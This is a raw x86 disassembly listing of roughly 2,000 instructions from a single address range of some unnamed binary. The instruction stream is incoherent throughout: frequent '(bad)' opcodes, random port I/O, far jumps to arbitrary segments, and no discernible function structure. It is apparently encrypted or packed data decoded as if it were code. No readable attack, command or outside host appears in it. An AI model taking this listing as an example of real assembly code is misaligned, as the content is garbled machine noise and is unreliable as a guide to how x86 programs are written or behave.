  413674:	or     ebx,DWORD PTR [ebp+0x40720ea5]
  41367a:	sub    ebp,DWORD PTR [ebx+eiz*2]
  41367d:	inc    esp
  41367e:	clc    
  41367f:	loope  0x413610
  413681:	pop    esp
  413682:	pop    es
  413683:	mov    dh,0xc9
  413685:	pop    ebx
  413686:	call   0x7a93154b
  41368b:	dec    esp
  41368c:	push   edx
  41368d:	test   BYTE PTR [eax-0x4b],dl
  413690:	add    eax,0x768183be
  413695:	popf   
  413696:	sbb    ecx,DWORD PTR [edi+0x20]
  413699:	shr    DWORD PTR [edi],cl
  41369b:	neg    BYTE PTR [edi-0x5c]
  41369e:	leave  
  41369f:	ss ss mov ebp,0x51bb1743
  4136a6:	(bad)  
  4136a7:	(bad)  
  4136a8:	pop    edx
  4136a9:	jb     0x413677
  4136ab:	dec    eax
  4136ac:	and    dl,dh
  4136ae:	sbb    cl,bh
  4136b0:	push   0x2b4100be
  4136b5:	ficom  DWORD PTR [edi]
  4136b7:	mov    ah,BYTE PTR [eax+0x37c0ce25]
  4136bd:	or     eax,0xb6044069
  4136c2:	inc    eax
  4136c3:	icebp  
  4136c4:	icebp  
  4136c5:	out    dx,al
  4136c6:	push   ebx
  4136c7:	fisubr WORD PTR [edx+0xc]
  4136ca:	imul   edx,esi,0x51d0db57
  4136d0:	xchg   edi,ebx
  4136d2:	mov    esp,0xc351ec57
  4136d7:	mov    edi,0x3d67cc56
  4136dc:	jg     0x413724
  4136de:	fld    TBYTE PTR [eax]
  4136e0:	lods   al,BYTE PTR ds:[esi]
  4136e1:	jo     0x4136a5
  4136e3:	mov    edi,0x8a5913b2
  4136e8:	cmc    
  4136e9:	xchg   BYTE PTR [edi],al
  4136eb:	inc    BYTE PTR [esi+0xa86105d]
  4136f1:	jg     0x4136f7
  4136f3:	retf   
  4136f4:	adc    bh,BYTE PTR [edi-0x1e7ec1eb]
  4136fa:	cld    
  4136fb:	scas   eax,DWORD PTR es:[edi]
  4136fc:	sub    eax,0x46616999
  413701:	js     0x4136fd
  413703:	mov    ds:0x81d7b3f7,al
  413708:	jl     0x413723
  41370a:	cmp    BYTE PTR [ebx+0x19],ah
  41370d:	dec    edi
  41370e:	add    al,0x3d
  413710:	or     dh,bh
  413712:	out    dx,al
  413713:	enter  0xc903,0xc1
  413717:	mov    ch,bh
  413719:	inc    edi
  41371a:	push   0xa4657cbd
  41371f:	aam    0x96
  413721:	in     eax,0x6d
  413723:	jne    0x4136ff
  413725:	jnp    0x413786
  413727:	(bad)  
  413728:	fwait
  413729:	or     ebx,DWORD PTR [edi]
  41372b:	jb     0x41377e
  41372d:	rcl    ch,1
  41372f:	xor    eax,0xc4726a3c
  413734:	xor    eax,0xb4cad9bc
  413739:	stos   DWORD PTR es:[edi],eax
  41373a:	leave  
  41373b:	push   eax
  41373c:	jecxz  0x4136d4
  41373e:	aas    
  41373f:	inc    eax
  413740:	shr    BYTE PTR [ecx+eiz*4],1
  413743:	sahf   
  413744:	add    eax,0x57c13194
  413749:	jecxz  0x41374a
  41374b:	aaa    
  41374c:	mov    BYTE PTR [ebp+0x9ff9acc],ch
  413752:	jmp    0x205f:0x63d63f0
  413759:	sbb    bl,BYTE PTR [edi+eiz*8-0x5c]
  41375d:	and    eax,0xa80bf3d
  413762:	pop    ebp
  413763:	jo     0x4137ae
  413765:	xor    BYTE PTR [ebp+ebp*2+0x50],ah
  413769:	(bad)  
  41376a:	iret   
  41376b:	cwde   
  41376c:	jnp    0x4137c3
  41376e:	popa   
  41376f:	push   ds
  413770:	push   eax
  413771:	fnstcw WORD PTR [ebp-0x1e]
  413774:	jp     0x413730
  413776:	shr    DWORD PTR [ecx-0x43e689c3],cl
  41377c:	mov    bl,0x65
  41377e:	cwde   
  41377f:	lods   eax,DWORD PTR ds:[esi]
  413780:	aad    0xec
  413782:	neg    DWORD PTR [edx]
  413784:	pop    ss
  413785:	sub    ch,BYTE PTR [edi]
  413787:	das    
  413788:	dec    eax
  413789:	aad    0x77
  41378b:	mov    ch,0xe9
  41378d:	or     DWORD PTR [ebx+0x4a8777b4],ebp
  413793:	das    
  413794:	popa   
  413795:	(bad)  
  413797:	push   eax
  413798:	push   cs
  413799:	pop    ss
  41379a:	or     eax,0x5d74f712
  41379f:	nop
  4137a0:	out    0x60,al
  4137a2:	icebp  
  4137a3:	add    DWORD PTR [edi],edi
  4137a5:	ds or  al,0xad
  4137a8:	(bad)  
  4137a9:	cwde   
  4137aa:	mov    esp,0xcf384b01
  4137af:	push   ecx
  4137b0:	inc    ebp
  4137b1:	fisubr DWORD PTR [ebx-0x169ea0db]
  4137b7:	ret    0xa173
  4137ba:	jo     0x4137b8
  4137bc:	icebp  
  4137bd:	or     al,0x2f
  4137bf:	imul   esi,DWORD PTR [ebx],0xe1de0ec6
  4137c5:	dec    edx
  4137c6:	adc    ecx,ebp
  4137c8:	in     eax,dx
  4137c9:	je     0x4137f2
  4137cb:	jb     0x41375b
  4137cd:	mov    bl,0x5
  4137cf:	addr16 test al,0xe8
  4137d2:	out    0x65,al
  4137d4:	and    eax,0x722561a9
  4137d9:	cwde   
  4137da:	into   
  4137db:	imul   edx,eax,0x63dfbf49
  4137e1:	xlat   BYTE PTR ds:[ebx]
  4137e2:	aam    0x81
  4137e4:	ja     0x413864
  4137e6:	jns    0x41381b
  4137e8:	xor    BYTE PTR [esp+ecx*8],bl
  4137eb:	mov    ebx,0x41357d58
  4137f0:	rcl    ch,1
  4137f2:	add    ebp,DWORD PTR [esi+eax*2+0x1c8cb0dc]
  4137f9:	dec    ebp
  4137fa:	aas    
  4137fb:	push   eax
  4137fc:	icebp  
  4137fd:	mov    ebx,DWORD PTR [ecx-0x1a8d2aaf]
  413803:	hlt    
  413804:	xchg   BYTE PTR [esp+esi*8-0x10],cl
  413808:	(bad)  
  413809:	cmc    
  41380a:	mov    esp,0x998248ec
  41380f:	pusha  
  413810:	sti    
  413811:	or     DWORD PTR [si-0x4],edi
  413815:	sub    BYTE PTR [ebp+edi*4+0x30],bh
  413819:	cmp    al,0x5d
  41381b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41381c:	push   ebx
  41381d:	imul   eax,DWORD PTR [eax-0x37a348ab],0xffffff95
  413824:	inc    esi
  413825:	xor    ebx,DWORD PTR [edi-0x6eef87cc]
  41382b:	add    esp,DWORD PTR [edi+0x28]
  41382e:	mov    al,0x4f
  413830:	loop   0x4137eb
  413832:	lock adc eax,0xafd1a2c5
  413838:	stc    
  413839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41383a:	sbb    cl,BYTE PTR [ebp-0x75]
  41383d:	mov    ch,0x8a
  41383f:	jmp    0x48ecbb1f
  413844:	fwait
  413845:	mov    edi,0x37caf040
  41384a:	jmp    0x9ff1c4d9
  41384f:	jecxz  0x413873
  413851:	cmp    edi,DWORD PTR es:[esi+edi*2+0x73]
  413856:	les    esi,FWORD PTR [edx-0x1600d5c4]
  41385c:	mov    dh,0x84
  41385e:	ss jae 0x41380d
  413861:	ins    DWORD PTR es:[edi],dx
  413862:	mov    al,ds:0x6e7f0faf
  413867:	push   edi
  413868:	cdq    
  413869:	popa   
  41386a:	cmp    eax,0x1f932fef
  41386f:	adc    DWORD PTR [eax+0x137be868],edi
  413875:	or     eax,0xec7a9216
  41387a:	pop    ecx
  41387b:	leave  
  41387c:	xor    eax,0xbb826f87
  413881:	inc    ebx
  413882:	aas    
  413883:	cmp    ch,ah
  413885:	sub    al,0x23
  413887:	retf   
  413888:	fmul   DWORD PTR ds:0xe340efe4
  41388e:	daa    
  41388f:	pop    eax
  413890:	add    eax,0x5dcb18fc
  413895:	sbb    al,0xe9
  413897:	shl    dl,1
  413899:	aam    0xeb
  41389b:	mov    dl,cl
  41389d:	xchg   BYTE PTR [edx-0x51d41c69],bh
  4138a3:	gs ds push esp
  4138a6:	test   DWORD PTR ds:0xbeeeb55d,0xe6a371e7
  4138b0:	pushf  
  4138b1:	add    al,0x66
  4138b3:	pop    ecx
  4138b4:	test   BYTE PTR [edx-0x5f],ch
  4138b7:	popf   
  4138b8:	(bad)  
  4138b9:	cmc    
  4138ba:	xchg   dh,al
  4138bc:	inc    ecx
  4138bd:	mov    dl,0x28
  4138bf:	mov    ebp,0xed4c8c71
  4138c4:	outs   dx,DWORD PTR ds:[esi]
  4138c5:	in     al,dx
  4138c6:	aas    
  4138c7:	pop    DWORD PTR [eax-0x28]
  4138ca:	pop    ds
  4138cb:	jecxz  0x4138b5
  4138cd:	(bad)  
  4138ce:	mov    esi,0xcf97b932
  4138d3:	xchg   bl,dl
  4138d5:	xchg   ebp,eax
  4138d6:	js     0x413914
  4138d8:	mov    esp,0x83cb81bf
  4138dd:	imul   edi,DWORD PTR [esp],0xffffffaf
  4138e1:	jbe    0x41394b
  4138e3:	aaa    
  4138e4:	and    dh,dh
  4138e6:	add    BYTE PTR [edx],dh
  4138e8:	rol    BYTE PTR [ebp+0x2e1c027b],1
  4138ee:	test   eax,0x459eada5
  4138f3:	(bad)  
  4138f4:	mov    eax,0xdb2ac8e4
  4138f9:	mov    DWORD PTR [edx+0x33],ecx
  4138fc:	sbb    BYTE PTR [esi],ch
  4138fe:	les    ecx,FWORD PTR ds:0x49f1468a
  413904:	adc    al,0xf0
  413906:	xlat   BYTE PTR ds:[ebx]
  413907:	ins    DWORD PTR es:[edi],dx
  413908:	mov    eax,ds:0x772dbb4e
  41390d:	dec    esi
  41390e:	outs   dx,BYTE PTR ds:[esi]
  41390f:	aas    
  413910:	push   es
  413911:	daa    
  413912:	push   0x6b8e2f47
  413917:	je     0x4138f6
  413919:	jo     0x413930
  41391b:	(bad)  
  41391c:	cmp    ecx,DWORD PTR [eax-0x3fcf222e]
  413922:	(bad)  
  413923:	mov    WORD PTR [edi],cs
  413925:	sub    ah,bh
  413927:	add    DWORD PTR [ebx],esp
  413929:	leave  
  41392a:	xchg   esp,eax
  41392b:	or     ecx,DWORD PTR [edi]
  41392d:	and    BYTE PTR [edi+ebp*2+0x46],dl
  413931:	sbb    al,0x53
  413933:	cmp    bh,bl
  413935:	add    DWORD PTR [edx],edx
  413937:	fst    DWORD PTR [eax-0x13523436]
  41393d:	not    esp
  41393f:	das    
  413940:	jle    0x413932
  413942:	icebp  
  413943:	adc    edi,eax
  413945:	shl    BYTE PTR [esi+0x23],cl
  413948:	push   edi
  413949:	cmc    
  41394a:	adc    ch,al
  41394c:	push   ecx
  41394d:	pop    esp
  41394e:	xor    eax,0x39f2937
  413953:	arpl   WORD PTR [ebx],ax
  413955:	mov    eax,ds:0x3fcd5ae5
  41395a:	push   ds
  41395b:	fs scas al,BYTE PTR es:[edi]
  41395d:	mov    cl,0x70
  41395f:	and    al,dh
  413961:	popf   
  413962:	adc    BYTE PTR [edx],ah
  413964:	int3   
  413965:	jo     0x413902
  413967:	jbe    0x413968
  413969:	jae    0x41394e
  41396b:	xor    eax,0x5dbef57f
  413970:	xchg   edx,eax
  413971:	inc    ecx
  413972:	inc    esi
  413973:	pop    eax
  413974:	jp     0x41394d
  413976:	mov    ebp,0x4b062acd
  41397b:	mov    edx,0x91d20490
  413980:	dec    eax
  413981:	pop    esp
  413983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413984:	or     ebp,DWORD PTR [edx-0x6e]
  413987:	dec    ebx
  413988:	cmp    DWORD PTR [edx-0x55],edi
  41398b:	dec    ecx
  41398c:	pop    ebx
  41398d:	mov    bl,0x9c
  41398f:	into   
  413990:	int3   
  413991:	cwde   
  413992:	fild   DWORD PTR [edx+0x6d]
  413995:	call   0x661b:0x8b06a102
  41399c:	xchg   esi,eax
  41399d:	mov    ds:0xe54feacd,eax
  4139a2:	jae    0x413939
  4139a4:	lods   eax,DWORD PTR ds:[esi]
  4139a5:	in     al,0xb8
  4139a7:	clc    
  4139a8:	popf   
  4139a9:	xor    esp,DWORD PTR ds:0x6324b8a2
  4139af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b0:	(bad)  [ebp+0x7e044a2f]
  4139b6:	or     eax,0x29babc43
  4139bb:	mov    ebp,0x4594c7e4
  4139c0:	mov    esp,0x5aea801
  4139c5:	push   esi
  4139c6:	mov    eax,0x7a409ba6
  4139cb:	mov    DWORD PTR [ecx],esp
  4139cd:	(bad)  
  4139ce:	rdpmc  
  4139d0:	inc    ecx
  4139d1:	ret    
  4139d2:	imul   edi,ebx,0xa494d461
  4139d8:	pushf  
  4139d9:	mov    eax,ds:0x8518b943
  4139de:	sub    dl,BYTE PTR [eax+0x7a9de5b1]
  4139e4:	sti    
  4139e5:	in     eax,dx
  4139e6:	cmp    al,bh
  4139e8:	fisub  WORD PTR [edi+0x3fc2ea87]
  4139ee:	pmulhuw mm0,QWORD PTR [edx+0x22]
  4139f2:	aaa    
  4139f3:	shl    dh,cl
  4139f5:	jmp    0x91a2:0xb9d044cc
  4139fc:	cmp    DWORD PTR [edx+0x51],eax
  4139ff:	dec    ebx
  413a00:	push   ds
  413a01:	sub    BYTE PTR [edx-0x4b],0xec
  413a05:	xor    BYTE PTR [ecx+0x66],dl
  413a08:	push   eax
  413a09:	mov    eax,ds:0x862ed3f7
  413a0e:	test   BYTE PTR [ecx+0x47],0xc
  413a12:	lds    eax,FWORD PTR [eax-0x12]
  413a15:	xchg   esi,eax
  413a16:	leave  
  413a17:	es std 
  413a19:	pop    edx
  413a1a:	jmp    0x413a8b
  413a1c:	fimul  WORD PTR es:[ecx+0x4bbf2a63]
  413a23:	into   
  413a24:	adc    esp,ecx
  413a26:	fsub   DWORD PTR [eax+0x4e]
  413a29:	adc    al,0x2a
  413a2b:	fstp   DWORD PTR [edi]
  413a2d:	dec    esp
  413a2e:	fs mov edx,0x22030e70
  413a34:	mov    al,ds:0x1b5029ae
  413a39:	lods   eax,DWORD PTR ds:[esi]
  413a3a:	lahf   
  413a3b:	dec    esp
  413a3c:	inc    ecx
  413a3d:	lock adc eax,0x6388dac
  413a43:	xchg   edi,eax
  413a44:	(bad)  
  413a45:	mov    esp,0x9da3e586
  413a4a:	mov    dh,bh
  413a4c:	cmc    
  413a4d:	test   esi,ebx
  413a4f:	and    eax,0x32d0cb6
  413a54:	xlat   BYTE PTR ds:[ebx]
  413a55:	ss (bad) 
  413a57:	jg     0x413aaf
  413a59:	push   0x75e828
  413a5e:	push   ebp
  413a5f:	(bad)  
  413a61:	fucom  st(6)
  413a63:	xchg   cl,cl
  413a65:	pushf  
  413a66:	dec    esi
  413a67:	fsubr  DWORD PTR [ecx-0x23]
  413a6a:	mov    bl,BYTE PTR [edx]
  413a6c:	mov    esi,0x576d5985
  413a71:	outs   dx,DWORD PTR ds:[esi]
  413a72:	cli    
  413a73:	mov    ah,0x12
  413a75:	sti    
  413a76:	adc    BYTE PTR [esi-0x75],al
  413a79:	mul    BYTE PTR [eax+0x79]
  413a7c:	sbb    al,0x76
  413a7e:	jb     0x413aca
  413a80:	and    al,0x7d
  413a82:	pop    esp
  413a83:	and    DWORD PTR [ecx-0x6c6e0cf1],ecx
  413a89:	jno    0x413afb
  413a8b:	je     0x413b06
  413a8d:	jmp    0xf52ec192
  413a92:	inc    eax
  413a93:	rol    BYTE PTR [ebx],0x20
  413a96:	in     eax,0xa5
  413a98:	fwait
  413a99:	inc    ebp
  413a9a:	add    eax,ecx
  413a9c:	fild   WORD PTR [edx]
  413a9e:	(bad)  
  413a9f:	(bad)  
  413aa1:	jae    0x413b1b
  413aa3:	sub    BYTE PTR [ecx-0x5],dl
  413aa6:	bound  ecx,QWORD PTR [edi]
  413aa8:	(bad)  
  413aa9:	xor    al,0x7b
  413aab:	into   
  413aac:	arpl   WORD PTR [eax+0x22],bx
  413aaf:	in     al,0x20
  413ab1:	imul   ecx,esi,0xffffff96
  413ab4:	stc    
  413ab5:	inc    ecx
  413ab6:	outs   dx,DWORD PTR ds:[esi]
  413ab7:	inc    eax
  413ab8:	jne    0x413a85
  413aba:	jmp    0x89c4:0xc925a4d3
  413ac1:	test   eax,0x7e4c42bf
  413ac6:	push   0x397a1e73
  413acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413acc:	int    0xbe
  413ace:	add    ebx,DWORD PTR [esi]
  413ad0:	fst    DWORD PTR [ebx+0x4a23c3c8]
  413ad6:	rol    BYTE PTR [eax-0x195f5260],cl
  413adc:	popa   
  413add:	add    eax,0x1b3d77f7
  413ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae3:	add    al,0x8a
  413ae5:	test   ah,ah
  413ae7:	lods   al,BYTE PTR ds:[esi]
  413ae8:	dec    esp
  413ae9:	add    eax,0xf057dad
  413aee:	mov    gs:0x3f1c3e34,al
  413af4:	sub    bl,ah
  413af6:	jg     0x413b4f
  413af8:	sbb    DWORD PTR [edi+0x7d28e252],esi
  413afe:	xor    esi,edi
  413b00:	imul   esp,DWORD PTR [edi],0x1da0ee0
  413b06:	push   ebx
  413b07:	stc    
  413b08:	pop    es
  413b09:	jno    0x413b4e
  413b0b:	mov    dl,0x40
  413b0d:	jno    0x413b2e
  413b0f:	and    ah,BYTE PTR [ecx]
  413b11:	call   0x6c114eb2
  413b16:	mov    esi,ds
  413b18:	mov    bl,0x44
  413b1a:	aas    
  413b1b:	sbb    edx,DWORD PTR [edi-0x3f]
  413b1e:	jge    0x413b19
  413b20:	cmp    DWORD PTR [eax-0x71],edx
  413b23:	push   esi
  413b24:	mov    dh,0xc0
  413b26:	test   DWORD PTR [esi],ecx
  413b28:	mov    edx,0xc5081c7e
  413b2d:	rcl    DWORD PTR [ecx],0x53
  413b30:	sub    DWORD PTR [edi],edi
  413b32:	clc    
  413b33:	push   ebp
  413b34:	gs pusha 
  413b36:	fstp   st(0)
  413b38:	sub    BYTE PTR [ecx],bh
  413b3a:	pop    ecx
  413b3b:	inc    eax
  413b3c:	retf   0xf3d7
  413b3f:	stos   BYTE PTR es:[edi],al
  413b40:	rcr    BYTE PTR [esi],cl
  413b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b43:	pop    ds
  413b44:	test   esi,ecx
  413b46:	add    al,BYTE PTR [bx+si+0x28]
  413b4a:	call   0x8c71:0x59e58ca7
  413b51:	loope  0x413b01
  413b53:	cmc    
  413b54:	pop    ds
  413b55:	fnstenv [eax+0x5d]
  413b58:	repz pop eax
  413b5a:	push   edx
  413b5b:	mov    ah,0x4
  413b5d:	xor    edi,DWORD PTR [edi]
  413b5f:	out    dx,al
  413b60:	lods   eax,DWORD PTR ds:[esi]
  413b61:	jmp    FWORD PTR [esi+0x11]
  413b64:	lahf   
  413b65:	xlat   BYTE PTR ds:[ebx]
  413b66:	or     BYTE PTR [edx],ch
  413b68:	aam    0xc7
  413b6a:	stos   BYTE PTR es:[edi],al
  413b6b:	popa   
  413b6c:	shl    DWORD PTR [ecx],0xf8
  413b6f:	or     ebx,0xab55efc1
  413b75:	xor    al,0x5b
  413b77:	inc    esi
  413b78:	cwde   
  413b79:	or     DWORD PTR [ecx],ebp
  413b7b:	neg    BYTE PTR [esi-0x3c0eac54]
  413b81:	cmp    BYTE PTR [edi+0x78],al
  413b84:	sub    BYTE PTR [esi+0x59cc10a4],ah
  413b8a:	shr    dl,0x93
  413b8d:	jnp    0x413bfa
  413b8f:	and    BYTE PTR ds:0xe49f143,cl
  413b95:	push   edi
  413b96:	inc    DWORD PTR [ecx+eiz*2+0x72]
  413b9a:	and    al,0xf6
  413b9c:	or     eax,0xc36c67f6
  413ba1:	cmp    eax,DWORD PTR [esi]
  413ba3:	pop    esp
  413ba4:	jle    0x413b46
  413ba6:	popf   
  413ba7:	push   esp
  413ba8:	mov    edx,0x971df3f6
  413bad:	and    ah,bh
  413baf:	inc    esi
  413bb0:	xor    DWORD PTR [edi+0x44],edx
  413bb3:	push   ebp
  413bb4:	test   BYTE PTR [eax-0x6d49296],ah
  413bba:	jno    0x413c34
  413bbc:	retf   
  413bbd:	ret    0x73e2
  413bc0:	mul    ebp
  413bc2:	call   0x3a16:0x34b8de7c
  413bc9:	mov    ch,0x6b
  413bcb:	lods   al,BYTE PTR ds:[esi]
  413bcc:	mov    al,bl
  413bce:	test   BYTE PTR [esi-0x796a062f],bl
  413bd4:	div    DWORD PTR [ebp+0x49fceab2]
  413bda:	sbb    ecx,DWORD PTR [esi]
  413bdc:	jl     0x413bf2
  413bde:	pop    esp
  413bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be0:	sub    eax,DWORD PTR [edi+ebp*8+0x4b]
  413be4:	call   0x262e7cc5
  413be9:	or     DWORD PTR [edx+0x32],esi
  413bec:	aad    0xb8
  413bee:	dec    ebp
  413bef:	call   0x3f6349b7
  413bf4:	(bad)  
  413bf6:	cmp    esi,DWORD PTR [esi-0x7b33ef57]
  413bfc:	int3   
  413bfd:	into   
  413bfe:	retf   0x214b
  413c01:	dec    ecx
  413c02:	push   ecx
  413c03:	pushf  
  413c04:	push   0x61b2317a
  413c09:	test   BYTE PTR [edi],dl
  413c0b:	fst    DWORD PTR es:[edi+eiz*4+0x4a]
  413c10:	dec    ebx
  413c11:	in     al,0xc6
  413c13:	cmp    al,0x71
  413c15:	add    dh,dl
  413c17:	add    dl,BYTE PTR [edi-0x15]
  413c1a:	pop    esi
  413c1b:	scas   eax,DWORD PTR es:[edi]
  413c1c:	push   ds
  413c1d:	add    bh,0x5a
  413c20:	in     al,0xdb
  413c22:	loope  0x413c24
  413c24:	in     eax,0x8b
  413c26:	rcr    DWORD PTR [edi+0x3d],cl
  413c29:	xor    esp,0x26b386ac
  413c2f:	loope  0x413c1e
  413c31:	(bad)  
  413c32:	cld    
  413c33:	xor    ebx,ecx
  413c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c36:	mov    esp,0x72e17c7b
  413c3b:	sbb    BYTE PTR [eax-0x4e],bh
  413c3e:	lea    ebp,[edi-0xc47c241]
  413c44:	fistp  QWORD PTR [edi]
  413c46:	add    eax,0xb1bb6e38
  413c4b:	add    eax,0xb6fa1b5a
  413c50:	fisttp QWORD PTR [eax+0x56]
  413c53:	shr    edx,cl
  413c55:	mov    ecx,DWORD PTR [ecx+0x2e581537]
  413c5b:	call   0x3b30:0x3f2075c7
  413c62:	xchg   ebp,eax
  413c63:	(bad)  [edi+eax*8+0x29]
  413c67:	scas   eax,DWORD PTR es:[edi]
  413c68:	jb     0x413c6b
  413c6a:	or     eax,0x946be2c0
  413c6f:	jg     0x413c3a
  413c71:	push   ds
  413c72:	jnp    0x413c65
  413c74:	mov    eax,ds:0x2b483bbe
  413c79:	pop    ecx
  413c7a:	ds inc ebp
  413c7c:	(bad)  
  413c7d:	jne    0x413c37
  413c7f:	div    edi
  413c81:	pop    edx
  413c82:	xchg   esp,eax
  413c83:	xor    dl,BYTE PTR [edi+0x31]
  413c86:	(bad)
  413c8a:	mov    eax,ds:0x76d679b4
  413c8f:	mov    dh,0x48
  413c91:	repnz rcr BYTE PTR [edx-0x482396f6],1
  413c98:	popa   
  413c99:	sbb    al,0x42
  413c9b:	retf   0x1215
  413c9e:	(bad)  
  413c9f:	fcom   QWORD PTR [eax+edx*2+0xc]
  413ca3:	add    eax,0x441d71a
  413ca8:	jbe    0x413c9f
  413caa:	jmp    0xc3be:0xfa418bbf
  413cb1:	pop    ds
  413cb2:	lahf   
  413cb3:	jnp    0x413c56
  413cb5:	xor    BYTE PTR [eax+edx*4],ah
  413cb8:	jle    0x413c66
  413cba:	idiv   BYTE PTR [ecx]
  413cbc:	addr16 adc al,0xb0
  413cbf:	dec    ebx
  413cc0:	cwde   
  413cc1:	or     dl,BYTE PTR [ebp+0x24]
  413cc4:	xor    cl,BYTE PTR [ebp+0x4ed29a6d]
  413cca:	and    DWORD PTR [eax-0x58],esp
  413ccd:	not    DWORD PTR [eax-0xf]
  413cd0:	dec    edi
  413cd1:	jbe    0x413d2c
  413cd3:	push   ss
  413cd4:	je     0x413c91
  413cd6:	call   0xe7f1e47a
  413cdb:	mov    ah,0x96
  413cdd:	enter  0xb9b7,0x3c
  413ce1:	shl    BYTE PTR [eax-0x41],1
  413ce4:	addr16 mov eax,0x9f3695c8
  413cea:	inc    edi
  413ceb:	jns    0x413d05
  413ced:	in     eax,0x98
  413cef:	dec    edi
  413cf0:	push   ebx
  413cf1:	dec    eax
  413cf2:	inc    edi
  413cf3:	(bad)  
  413cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf5:	sbb    eax,0xdfa7536
  413cfa:	push   esi
  413cfb:	(bad)  
  413cfc:	sar    BYTE PTR [edi+0x59],1
  413cff:	shl    DWORD PTR [edx-0x11],1
  413d02:	ins    BYTE PTR es:[edi],dx
  413d03:	mov    edx,0x888b5d9f
  413d08:	das    
  413d09:	iret   
  413d0a:	mov    esi,0xff73df88
  413d0f:	sub    eax,edi
  413d11:	push   eax
  413d12:	out    0x25,al
  413d14:	sbb    al,BYTE PTR [ecx+0x3]
  413d17:	lahf   
  413d18:	add    eax,0x8c2cb650
  413d1d:	push   ebx
  413d1e:	sbb    dh,bl
  413d20:	mov    ds:0x19cd8c0e,eax
  413d25:	fimul  WORD PTR [edi-0x60b75630]
  413d2b:	int3   
  413d2c:	push   es
  413d2d:	or     ebx,ebp
  413d2f:	iret   
  413d30:	sub    BYTE PTR [edi-0x30233689],0x50
  413d37:	sub    al,0xec
  413d39:	sbb    BYTE PTR [edx+0x66d5803f],0x37
  413d40:	adc    DWORD PTR [esi],esp
  413d42:	dec    esp
  413d43:	pop    ebp
  413d44:	push   ds
  413d45:	(bad)  
  413d46:	stos   BYTE PTR es:[edi],al
  413d47:	xchg   esp,eax
  413d48:	clc    
  413d49:	pop    esi
  413d4a:	stc    
  413d4b:	shr    DWORD PTR [eax+0x54f41a7],0x3b
  413d52:	(bad)  
  413d53:	mov    eax,0xb0a5c801
  413d58:	lods   eax,DWORD PTR ds:[esi]
  413d59:	xchg   ebp,eax
  413d5a:	cmp    al,0x50
  413d5c:	ret    0xf596
  413d5f:	xor    esi,DWORD PTR [ebp-0x7b8fdcd1]
  413d65:	clc    
  413d66:	test   bh,bh
  413d68:	in     al,0xd5
  413d6a:	and    esi,0x33
  413d6d:	pop    ebx
  413d6e:	mov    ebp,0xbf0e1b1e
  413d73:	pusha  
  413d74:	mov    ds:0xf926beb0,eax
  413d79:	ret    
  413d7a:	adc    eax,0x6f79869b
  413d7f:	mov    eax,ds:0xa765d6fa
  413d84:	or     eax,0xc7ff7347
  413d89:	loopne 0x413d8d
  413d8b:	sub    al,0x2
  413d8d:	(bad)  
  413d8e:	imul   ecx,DWORD PTR [edi-0x58],0xffffff81
  413d92:	sub    DWORD PTR [edx+esi*8],esp
  413d95:	mov    esp,0xef2727a5
  413d9a:	cmp    eax,0xa5092c92
  413d9f:	push   ebx
  413da0:	jl     0x413d4f
  413da2:	sti    
  413da3:	inc    edi
  413da4:	call   0xc197:0xf80aed75
  413dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dac:	fchs   
  413dae:	mov    edi,0xa1984cf6
  413db3:	sbb    esp,DWORD PTR [ebx]
  413db5:	inc    edx
  413db6:	sub    ah,BYTE PTR [esi]
  413db8:	push   ebp
  413db9:	sub    eax,0xe3bcc634
  413dbe:	jb     0x413da1
  413dc0:	iret   
  413dc1:	repnz mov ebp,0x3785cd3d
  413dc7:	pop    edi
  413dc8:	ffreep st(4)
  413dca:	lock mov al,ds:0x6bfcf097
  413dd0:	mov    al,0xe5
  413dd2:	cmp    al,0x8a
  413dd4:	out    0xff,eax
  413dd6:	jmp    0x74ea:0x7f5c5503
  413ddd:	sbb    BYTE PTR [ecx],cl
  413ddf:	in     al,0x9e
  413de1:	push   ss
  413de2:	mov    edx,ds
  413de4:	adc    dl,BYTE PTR [edx+0x100bc93b]
  413dea:	fld    QWORD PTR [edx-0x3e]
  413ded:	mov    esi,0xe3d24313
  413df2:	ins    BYTE PTR es:[edi],dx
  413df3:	and    ebx,DWORD PTR [esi-0x417ad5f4]
  413df9:	fcomi  st,st(3)
  413dfb:	js     0x413e0e
  413dfd:	sbb    eax,0xa0c8250
  413e02:	ins    DWORD PTR es:[edi],dx
  413e03:	in     eax,dx
  413e04:	mov    edi,0x6bdd419b
  413e09:	push   edx
  413e0a:	nop
  413e0b:	repnz adc al,0x80
  413e0e:	in     eax,dx
  413e0f:	leave  
  413e10:	or     BYTE PTR [esi+eax*8],dh
  413e13:	mov    eax,ds:0xb15ab585
  413e18:	push   es
  413e19:	loope  0x413e80
  413e1b:	mov    esi,0x55d635d
  413e20:	out    dx,al
  413e21:	js     0x413dcc
  413e23:	sub    al,0x6d
  413e25:	data16 or cl,dh
  413e28:	sub    BYTE PTR [edi-0x24],0xa2
  413e2c:	shl    DWORD PTR [esi+eiz*4+0x3e],1
  413e30:	ds and eax,0xc69ee2e8
  413e36:	fnsave [ebx-0x718f409c]
  413e3c:	xchg   esi,eax
  413e3d:	fcmovnbe st,st(7)
  413e3f:	sub    BYTE PTR [eax],ah
  413e41:	(bad)  
  413e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e43:	pop    es
  413e44:	cs gs pop ebp
  413e47:	aas    
  413e48:	inc    ecx
  413e49:	mov    dl,0x51
  413e4b:	add    bl,ah
  413e4d:	xor    esi,ecx
  413e4f:	xchg   al,dl
  413e51:	inc    esp
  413e52:	xchg   DWORD PTR [ebp+0x0],ecx
  413e55:	or     edi,DWORD PTR [ecx+0xf]
  413e58:	dec    esi
  413e59:	sbb    BYTE PTR [ecx],cl
  413e5b:	push   cs
  413e5c:	dec    esp
  413e5d:	inc    ebp
  413e5e:	(bad)  
  413e60:	sti    
  413e61:	(bad)  
  413e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
